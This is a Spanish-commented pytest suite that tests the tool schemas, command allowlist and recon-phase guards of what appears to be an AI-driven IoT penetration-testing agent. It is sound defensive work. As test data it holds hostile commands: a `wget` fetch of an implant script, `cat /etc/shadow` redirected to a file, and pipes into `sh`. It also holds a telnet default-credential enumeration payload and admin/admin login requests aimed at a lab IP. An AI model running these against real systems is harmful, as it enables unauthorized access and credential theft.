"""Endurecimiento del contrato de herramientas (iter_18).

Revisión completa del catálogo que destapó cuatro clases de defecto, cada una con
su regresión aquí:

  1. **Argumentos que la implementación lee pero el schema no declara.** El caso
     principal era `cve_search(cpe=…)`: la implementación lo aceptaba y lo usaba,
     pero el modelo no podía emitirlo porque el schema no lo declaraba. El barrido
     determinista base no se veía afectado (`cve_scan_recon` va por CPE sin pasar
     por `_cve_search`); lo inalcanzable era el **refinamiento por componente** que
     el prompt pide priorizar, que quedaba reducido a búsqueda por palabra clave.
  2. **Argumentos reservados al sistema alcanzables por el modelo.**
     `canonical_severity` es el techo de severidad por tipo de hallazgo: quien
     está sometido al techo no puede fijarlo.
  3. **Reglas que solo existían en el prompt.** "En recon solo GET" era texto que
     el modelo podía ignorar; ahora es un guard determinista.
  4. **Contradicciones código↔documentación.** `wget` estaba en la allowlist y la
     memoria afirmaba lo contrario; el umbral de latencia efectivo era 5000 ms
     frente a los 2000 ms documentados.
"""
import pytest

import core.tools as toolbox
from core.policy_engine import PolicyEngine, PolicyViolation


def setup_function():
    toolbox.build_registry()
    toolbox.bind_session(toolbox.AgentSession(target_ip="192.168.1.50"))


# --------------------------------------------------- 1) schema ↔ implementación

def test_cve_search_declares_cpe_parameter():
    """Sin `cpe` en el schema, el modelo no podía pedir la búsqueda por CPE."""
    schema = toolbox._REGISTRY["cve_search"].parameters
    props = schema["properties"]
    assert "cpe" in props, "cve_search debe declarar `cpe`: es la vía determinista"
    assert "keyword" in props and "version" in props
    # El catálogo es la superficie que ve el MODELO y está en inglés (§4.4): lo
    # que se comprueba es que la descripción declare el determinismo, no en qué
    # idioma lo diga.
    assert "deterministic" in props["cpe"]["description"].lower()


def test_execute_command_declares_auto_retry_login():
    props = toolbox._REGISTRY["execute_command"].parameters["properties"]
    assert "auto_retry_login" in props
    assert props["auto_retry_login"]["type"] == "boolean"


def test_every_tool_parameter_is_documented():
    """Un parámetro sin descripción es un parámetro que el modelo usará mal."""
    undocumented = []
    for tool in toolbox.list_tools():
        for name, spec in (tool.parameters.get("properties") or {}).items():
            if not (isinstance(spec, dict) and spec.get("description")):
                undocumented.append(f"{tool.name}.{name}")
    assert not undocumented, f"parámetros sin descripción: {undocumented}"


def test_mandatory_parameters_are_declared_required():
    """`required` es la forma de la API de exigir un argumento; dejarlo vacío
    delegaba en la suerte que el modelo lo enviara."""
    expected = {
        "probe_udp": {"port"},
        "probe_tcp": {"port"},
        "mac_vendor_lookup": {"mac"},
        "execute_command": {"cmd"},
        "execute_chain": {"chain"},
        "execute_websocket": {"url"},
        "record_finding": {"title", "severity", "confirmed"},
        "record_cve_findings": {"cves"},
        "run_probes": {"probes"},
        "transition_phase": {"phase"},
        "done": {"summary"},
    }
    for name, required in expected.items():
        actual = set(toolbox._REGISTRY[name].parameters.get("required") or [])
        assert required <= actual, f"{name}: falta required {required - actual}"


def test_closed_domains_are_declared_as_enums():
    """Dominio cerrado en la API = menos varianza que enumerarlo en el prompt."""
    cases = {
        ("record_finding", "severity"): {"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"},
        ("record_finding", "impact"): {"EXEC", "ACCESS", "EXFIL", "CRASH",
                                       "DISCLOSURE", "EXPOSURE", "HYGIENE"},
        ("transition_phase", "phase"): {"recon", "exploit"},
        ("web_login", "scheme"): {"http", "https"},
        ("probe_tcp", "proto_hint"): {"tuya", "esphome", "http", "redis"},
    }
    for (tool_name, param), values in cases.items():
        spec = toolbox._REGISTRY[tool_name].parameters["properties"][param]
        assert set(spec.get("enum") or []) == values, f"{tool_name}.{param}"


def test_obj_helper_rejects_required_that_does_not_exist():
    """Un `required` mal escrito debe reventar al construir el registro, no
    generar un schema inválido que la API acepte a medias."""
    with pytest.raises(ValueError):
        toolbox._obj("nope", cmd=toolbox._str("x"))


def test_todas_las_tools_producen_un_schema_valido():
    """Cada tool tiene que convertirse al formato de la API sin perder nada.

    Antes esto se comprobaba dejando que el SDK del proveedor validase el
    schema por su cuenta. Al quedar un solo proveedor la comprobación se hace
    explícita: es preferible que la suite diga qué campo falta a que la API
    devuelva un 400 en mitad de una auditoría.
    """
    tools = toolbox.list_claude_tools()
    assert len(tools) == len(toolbox.list_tools())
    for t in tools:
        assert t["name"] and isinstance(t["name"], str), t
        assert t["description"], t["name"]
        esquema = t["input_schema"]
        assert esquema["type"] == "object", t["name"]
        assert isinstance(esquema.get("properties"), dict), t["name"]
        for req in esquema.get("required") or []:
            assert req in esquema["properties"], f"{t['name']}: required '{req}' sin definir"


# ------------------------------------------- 2) argumentos internos del sistema

def test_dispatch_strips_model_supplied_canonical_severity():
    """El modelo no puede fijar su propio techo de severidad."""
    toolbox.dispatch("record_finding", {
        "cve_id": "MDNS-EXPOSED",
        "title": "mDNS expuesto",
        "severity": "MEDIUM",
        "confirmed": True,
        "impact": "DISCLOSURE",
        "canonical_severity": "CRITICAL",   # intento de subir el techo
        "raw_output": '{"model": "X"}',
    })
    finding = toolbox.get_session().findings[0]
    assert finding.get("canonical_severity") is None


def test_auto_register_still_sets_the_canonical_ceiling():
    """El auto-registro interno (no pasa por dispatch) sí fija el techo."""
    toolbox._auto_register_probe_findings(
        "probe_mdns", {"ip": "192.168.1.50"},
        {"ip": "192.168.1.50", "vulnerabilities": [
            {"id": "MDNS-EXPOSED", "severity": "INFO",
             "description": "Servicios mDNS anunciados"},
        ]},
    )
    finding = toolbox.get_session().findings[0]
    assert finding["canonical_severity"] == "INFO"
    # Y el modelo no puede inflarlo re-registrando por encima.
    toolbox.dispatch("record_finding", {
        "cve_id": "MDNS-EXPOSED", "title": "mDNS", "severity": "HIGH",
        "confirmed": True, "impact": "DISCLOSURE",
        "canonical_severity": "CRITICAL",
    })
    assert toolbox.get_session().findings[0]["canonical_severity"] == "INFO"
    assert toolbox.effective_severity(toolbox.get_session().findings[0]) == "INFO"


def test_run_probes_batch_also_strips_internal_args():
    """El batch no puede ser la puerta trasera del saneado de `dispatch`."""
    stripped = toolbox._strip_internal_args(
        {"probe": "probe_snmp", "canonical_severity": "CRITICAL"})
    assert "canonical_severity" not in stripped
    assert stripped["probe"] == "probe_snmp"


# ----------------------------------------- 3) solo lectura determinista en recon

RECON_WRITE_COMMANDS = [
    "curl -sk -X POST http://192.168.1.50/apply.cgi",
    "curl -sk -X PUT http://192.168.1.50/api/v1/config",
    "curl -sk -X DELETE http://192.168.1.50/api/v1/session",
    "curl -sk -X PATCH http://192.168.1.50/api/v1/config",
    "curl -sk -d 'user=admin&pass=admin' http://192.168.1.50/login.php",
    "curl -sk --data-binary @/dev/null http://192.168.1.50/upload",
]


@pytest.mark.parametrize("cmd", RECON_WRITE_COMMANDS)
def test_recon_phase_rejects_state_changing_commands(cmd):
    toolbox.set_phase("recon")
    guard = toolbox._recon_readonly_guard(cmd)
    assert guard is not None, f"debería bloquearse en recon: {cmd}"
    assert guard["error_type"] == "RECON_READ_ONLY"
    assert "transition_phase" in guard["instruction"]


@pytest.mark.parametrize("cmd", [
    "curl -sk http://192.168.1.50/config.cfg",
    "curl -sk -I http://192.168.1.50/",
    "curl -sk -X GET http://192.168.1.50/api/v1/system",
    "nc -zv 192.168.1.50 23",
])
def test_recon_phase_allows_read_only_commands(cmd):
    toolbox.set_phase("recon")
    assert toolbox._recon_readonly_guard(cmd) is None


@pytest.mark.parametrize("cmd", RECON_WRITE_COMMANDS)
def test_exploit_phase_allows_state_changing_commands(cmd):
    """La restricción es de FASE, no una prohibición global: en exploit se permite."""
    toolbox.set_phase("exploit")
    assert toolbox._recon_readonly_guard(cmd) is None


def test_transition_phase_updates_the_session_phase():
    toolbox.set_phase("recon")
    toolbox.dispatch("transition_phase", {"phase": "exploit"})
    assert toolbox.get_session().phase == "exploit"


# --------------------------------- 4) coherencia con lo que afirma la memoria

def test_wget_is_outside_the_policy_allowlist():
    """§5.11 describe `wget` como binario fuera de la allowlist. Estaba dentro, y
    además era el único capaz de escribir en disco sin `>` (descarga al cwd)."""
    engine = PolicyEngine()
    for cmd in ("wget -q http://198.51.100.13/implant.sh",
                "wget http://198.51.100.13/x -O /tmp/x"):
        with pytest.raises(PolicyViolation):
            engine.validate_and_parse(cmd)


def test_curl_cannot_write_files_but_still_audits():
    """El sustituto de wget no abre la primitiva de escritura que se cerró."""
    engine = PolicyEngine()
    tool, _args, _ = engine.validate_and_parse(
        "curl -sk http://192.168.1.50/config.cfg")
    assert tool == "curl"
    for cmd in ("curl -o /tmp/x http://192.168.1.50/x",
                "curl -sko /tmp/x http://192.168.1.50/x"):  # también agrupado
        with pytest.raises(PolicyViolation):
            engine.validate_and_parse(cmd)


# ------------------------------- 5) flags cortos agrupados (bug de alto impacto)

@pytest.mark.parametrize("cmd", [
    "curl -sk http://192.168.1.50/config.cfg",
    "curl -sk -H 'Cookie: PHPSESSID=abc' http://192.168.1.50/admin/",
    "curl -skL http://192.168.1.50/",
    "curl -si http://192.168.1.50/",
    "curl -sS http://192.168.1.50/",
    "nc -zv 192.168.1.50 23",
])
def test_clustered_short_flags_are_accepted(cmd):
    """`curl -sk` es la forma idiomática Y la que usan los prompts, pero la
    validación token a token la rechazaba: cada comando que el agente copiaba de su
    propio prompt moría en POLICY_VIOLATION y gastaba un turno."""
    engine = PolicyEngine()
    tool, _args, _ = engine.validate_and_parse(cmd)
    assert tool in ("curl", "nc")


def test_clustering_does_not_relax_the_allowlist():
    """La expansión solo vale si CADA letra está permitida por separado; si no,
    el token sigue intacto y la allowlist decide. Agrupar no es un bypass."""
    engine = PolicyEngine()
    for cmd in ("curl -ske http://192.168.1.50/",   # -e no permitido
                "curl -sko /tmp/x http://192.168.1.50/"):  # -o no permitido
        with pytest.raises(PolicyViolation):
            engine.validate_and_parse(cmd)
    # Un flag con valor pegado no se desagrupa por error en letras sueltas.
    tool, args, _ = engine.validate_and_parse("curl -m30 http://192.168.1.50/")
    assert tool == "curl" and "-m30" in args


def test_every_command_the_prompts_instruct_passes_the_policy():
    """Cierra el círculo prompt↔política: **todo** comando de ejemplo que los
    prompts ordenan ejecutar tiene que pasar el PolicyEngine.

    Esta comprobación nació de `curl -sk` (rechazado por no desagrupar flags
    cortos) y habría cazado sola el segundo caso de la misma familia: el patrón
    `printf '…' | nc <ip> 23` de enumeración telnet moría como violación de
    política porque `printf` no estaba en la allowlist —y encima `core/tools.py`
    reescribe `echo -e` a `printf`, convirtiendo un comando permitido en uno
    rechazado—. Pedirle al agente algo que el sistema le prohíbe es un fallo del
    sistema, no del agente."""
    import re as _re
    from core.prompts import get_phase_prompt, reset_cache
    reset_cache()
    engine = PolicyEngine()

    def _concretize(cmd: str) -> str:
        """Sustituye los marcadores del prompt por valores reales."""
        cmd = cmd.replace("\\\\n", "\\n")          # el prompt escapa los \n del printf
        for ph, val in (("<ip>", "192.168.1.50"), ("<url>", "http://192.168.1.50/x"),
                        ("<port>", "8080"), ("<user>", "admin"), ("<pass>", "admin"),
                        ("<session_cookie>", "PHPSESSID=abc"), ("<js-path>", "js/app.js")):
            cmd = cmd.replace(ph, val)
        return cmd

    checked = []
    for phase in ("recon", "exploit"):
        prompt = get_phase_prompt(phase)
        # Comandos que el prompt manda ejecutar explícitamente.
        for match in _re.finditer(r'execute_command\(cmd="([^"]+)"', prompt):
            cmd = _concretize(match.group(1))
            if "<" in cmd or "…" in cmd:
                continue          # plantilla sin concretar: no es un comando real
            engine.validate_and_parse(cmd)   # levanta PolicyViolation si no pasa
            checked.append(cmd)

    assert len(checked) >= 4, f"se validaron muy pocos comandos: {checked}"
    assert any(c.startswith("printf") for c in checked), "el patrón printf|nc debe cubrirse"
    assert any(c.startswith("curl -sk") for c in checked)


def test_exploiter_has_no_second_allowlist():
    """Una sola fuente de verdad sobre qué binarios se pueden ejecutar."""
    from modules.exploiter import ActiveExploiter
    assert not hasattr(ActiveExploiter(bypass_policy=True), "allowed_tools")


def test_safety_monitor_latency_threshold_matches_documentation():
    """La memoria (§4) declara 2000 ms; el wrapper imponía 5000 ms."""
    import inspect
    sig = inspect.signature(toolbox.attach_safety_monitor)
    assert sig.parameters["latency_threshold_ms"].default == 2000.0
    from core.safety_monitor import SafetyMonitorV2
    assert inspect.signature(
        SafetyMonitorV2.__init__).parameters["latency_threshold_ms"].default == 2000.0


# ------------- 6) clase de impacto declarada por la sonda (gobernanza)

def test_probe_findings_declare_the_impact_class_they_demonstrated():
    """Las sondas declaraban severidad pero NUNCA clase de impacto, así que
    `effective_severity` topaba a LOW todo hallazgo auto-registrado —incluido un
    shell obtenido con credenciales por defecto— y la severidad efectiva dependía
    de que el LLM re-registrase el hallazgo. La evidencia determinista no puede
    valer menos que la afirmación del modelo."""
    toolbox._auto_register_probe_findings(
        "probe_telnet", {"ip": "192.168.1.50", "port": 23},
        {"ip": "192.168.1.50", "port": 23, "vulnerabilities": [
            {"id": "TELNET-DEFAULT-CRED", "severity": "CRITICAL",
             "description": "Telnet acepta root:root",
             "shell_output": "uid=0(root) gid=0(root)"},
        ]},
    )
    finding = toolbox.get_session().findings[0]
    assert finding["impact"] == "ACCESS"
    assert toolbox.effective_severity(finding) == "CRITICAL"


def test_banner_only_probe_findings_stay_low():
    """Lo que solo coincide por banner es superficie, no explotación: la tabla es
    conservadora a propósito y estos siguen topando a LOW.

    `LG-WEBOS-EXPOSED` salió de esta lista y pasó a INFO. No es una excepción:
    es que los dos casos son distintos. Una firma de versión (`SMB-V1-EXPOSED`,
    `TELNET-MIRAI-BUSYBOX`) dice algo que la tabla de puertos no dice —qué
    versión corre—, mientras que «WebOS está expuesto» repite exactamente lo que
    ya figura en la superficie de ataque. Lo primero es un hallazgo débil; lo
    segundo no es un hallazgo. Ver `_SURFACE_ONLY_IDS`.
    """
    for vuln_id, severity in (("TELNET-MIRAI-BUSYBOX", "HIGH"),
                              ("SMB-V1-EXPOSED", "HIGH"),
                              ("CWMP-ROMPAGER-CVE-2014-9222", "CRITICAL")):
        toolbox.bind_session(toolbox.AgentSession(target_ip="192.168.1.50"))
        toolbox._auto_register_probe_findings(
            "probe_x", {"ip": "192.168.1.50"},
            {"ip": "192.168.1.50", "vulnerabilities": [
                {"id": vuln_id, "severity": severity, "description": "firma de banner"}]},
        )
        finding = toolbox.get_session().findings[0]
        assert finding["impact"] == "EXPOSURE", vuln_id
        assert toolbox.effective_severity(finding) == "LOW", vuln_id


def test_la_reafirmacion_de_superficie_no_es_un_hallazgo():
    """«El puerto 22 tiene SSH» ya está en la tabla de puertos abiertos.

    De 20 confirmados de una tanda de campo, 13 eran de clase EXPOSURE y ninguno
    demostraba acceso ni extracción; uno de ellos, un `SSH-EXPOSED`, llevaba en
    su propia interpretación «se probaron múltiples credenciales por defecto sin
    éxito». Contar eso como vulnerabilidad confirmada vacía la palabra que separa
    este trabajo de un escáner.
    """
    for vuln_id in ("SSH-EXPOSED", "TELNET-EXPOSED", "LG-WEBOS-EXPOSED",
                    "MDNS-EXPOSED", "HTTP-4070-EXPOSED", "PORT-8888-EXPOSED"):
        f = {"cve_id": vuln_id, "severity": "MEDIUM", "confirmed": True,
             "impact": "EXPOSURE", "raw_output": "nmap: puerto abierto"}
        assert toolbox.effective_severity(f) == "INFO", vuln_id
        assert toolbox.is_confirmed_vuln(f) is False, vuln_id


def test_lo_que_si_anade_algo_a_la_superficie_sigue_contando():
    """El criterio es si el hallazgo dice algo que la tabla de puertos no dice,
    no si su nombre acaba en EXPOSED. Una versión antigua, un certificado
    autofirmado o un proxy que ACEPTA no autenticar sí lo dicen."""
    for vuln_id in ("SSH-DROPBEAR-OLD", "TLS-SELF-SIGNED", "SOCKS5-NOAUTH",
                    "UPNP-DESCRIPTOR-EXPOSURE"):
        f = {"cve_id": vuln_id, "severity": "LOW", "confirmed": True,
             "impact": "EXPOSURE", "raw_output": "banner: dropbear_2019.78"}
        assert toolbox.is_confirmed_vuln(f) is True, vuln_id


def test_unmapped_probe_finding_stays_conservative():
    """Un hallazgo nuevo sin entrada en la tabla no se infla: sigue en LOW hasta
    que alguien decida y documente su clase."""
    toolbox._auto_register_probe_findings(
        "probe_nuevo", {"ip": "192.168.1.50"},
        {"ip": "192.168.1.50", "vulnerabilities": [
            {"id": "PROTOCOLO-INVENTADO-EXPOSED-2099", "severity": "CRITICAL",
             "description": "algo nuevo"}]},
    )
    finding = toolbox.get_session().findings[0]
    assert finding["impact"] == ""
    assert toolbox.effective_severity(finding) == "LOW"


def test_probe_declared_impact_wins_over_the_table():
    """Una sonda puede ser más precisa que la tabla; su declaración manda."""
    toolbox._auto_register_probe_findings(
        "probe_telnet", {"ip": "192.168.1.50"},
        {"ip": "192.168.1.50", "vulnerabilities": [
            {"id": "TELNET-DEFAULT-CRED", "severity": "CRITICAL",
             "impact": "EXEC", "description": "ejecutó comandos"}]},
    )
    assert toolbox.get_session().findings[0]["impact"] == "EXEC"


def test_impact_table_only_uses_valid_classes():
    """Una clase mal escrita en la tabla degradaría el hallazgo a LOW en silencio."""
    valid = set(toolbox._IMPACT_MAX_SEVERITY)
    for vuln_id, impact in toolbox._PROBE_IMPACT_CLASS.items():
        assert impact in valid, f"{vuln_id} → clase inválida {impact}"
    for _prefix, impact in toolbox._PROBE_IMPACT_PREFIXES:
        assert impact in valid


def test_score_is_reproducible_from_an_archived_report():
    """La clase de impacto es propiedad del TIPO de hallazgo, así que recalcular
    sobre un informe archivado —que no lleva el campo `impact`— debe dar lo mismo
    que calcular durante el run. Sin este fallback, las cifras del Capítulo 5 no
    eran reproducibles desde los informes guardados, que es lo que OE5 promete."""
    archived = {"cve_id": "TELNET-DEFAULT-CRED", "confirmed": True,
                "severity": "CRITICAL",  # sin campo `impact`, como los informes viejos
                "raw_output": "uid=0(root) gid=0(root)"}
    assert toolbox.effective_severity(archived) == "CRITICAL"
    # Y lo que es coincidencia de banner sigue sin inflar el veredicto.
    banner = {"cve_id": "SSH-DROPBEAR-OLD", "confirmed": True, "severity": "MEDIUM",
              "raw_output": "SSH-2.0-dropbear_2016.74"}
    assert toolbox.effective_severity(banner) == "LOW"


def test_unknown_finding_type_still_needs_an_explicit_impact():
    """El fallback por tipo no es una puerta para inflar cualquier cosa: un id
    desconocido sigue exigiendo que alguien declare la clase de impacto."""
    unknown = {"cve_id": "CVE-2099-99999", "confirmed": True, "severity": "CRITICAL",
               "raw_output": "algo"}
    assert toolbox.effective_severity(unknown) == "LOW"


# ------- 7) payloads que viajan al dispositivo ≠ instrucciones del shell local

@pytest.mark.parametrize("cmd", [
    # El patrón de enumeración telnet que documenta el prompt: el `2>/dev/null`
    # va DENTRO de la carga, destinado al shell del dispositivo.
    "printf 'root\\nroot\\nid; cat /etc/*release 2>/dev/null\\nexit\\n' | nc 192.168.1.50 23",
    "echo -e 'id; uname -a 2>/dev/null' | nc 192.168.1.50 23",
    # Cuerpo SOAP en -d: el `<` es XML, no una redirección de entrada.
    "curl -sk -d '<soap:Envelope><Body/></soap:Envelope>' http://192.168.1.50/HNAP1/",
])
def test_quoted_payloads_are_data_not_local_redirection(cmd):
    """La política contiene el plano de ejecución LOCAL. Leer el contenido de una
    carga entrecomillada como si fuera una instrucción del shell local rechazaba
    comandos legítimos —incluido el que el propio prompt ordena para enumerar un
    dispositivo tras obtener shell—."""
    engine = PolicyEngine()
    tool, _args, _ = engine.validate_and_parse(cmd)
    assert tool


@pytest.mark.parametrize("cmd", [
    "printf 'x' > /tmp/leak",          # redirección real, fuera de las comillas
    "echo 'hola' > /tmp/f",
    "printf 'x' | sh",                 # tubería a shell
    "echo 'x' | bash",
    "cat /etc/shadow > /tmp/leak",
])
def test_neutralizing_payloads_does_not_open_the_real_holes(cmd):
    """Neutralizar lo entrecomillado no puede convertirse en un bypass: una
    redirección o una tubería a shell FUERA de las comillas sigue bloqueada."""
    engine = PolicyEngine()
    with pytest.raises(PolicyViolation):
        engine.validate_and_parse(cmd)


def test_printf_is_allowlisted_because_the_prompt_requires_it():
    """`echo -e` imprime "-e" literal en dash (el shell habitual en IoT), así que
    el prompt manda usar `printf` y `core/tools.py` reescribe `echo -e` a `printf`.
    Sin printf en la allowlist, ese reescribido convertía un comando permitido en
    una violación de política."""
    from core.policy_engine import ALLOWED_TOOLS, PIPE_ALLOWED
    assert "printf" in ALLOWED_TOOLS
    assert "printf" in PIPE_ALLOWED


def test_the_echo_dash_e_rewrite_produces_an_executable_command():
    """Cierra el círculo del reescribido: lo que `tools.py` genera debe pasar la
    política, no morir en ella."""
    toolbox.set_phase("exploit")
    result = toolbox.dispatch("execute_command", {
        "cmd": "echo -e 'id\\nexit' | nc 127.0.0.1 9",   # puerto 9 (discard), cerrado
        "timeout": 5,
    })
    assert result.get("error_type") != "POLICY_VIOLATION", result
